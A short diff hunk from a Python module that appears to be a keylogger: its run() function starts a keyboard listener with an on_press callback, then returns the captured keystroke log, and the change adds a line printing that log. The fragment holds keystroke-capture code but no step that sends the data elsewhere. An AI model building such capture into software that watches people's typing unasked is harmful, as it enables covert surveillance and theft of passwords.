@@ -68,4 +68,6 @@ def run(**args):
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
+    print("value:", kl.log.getvalue())
+
     return kl.log.getvalue()
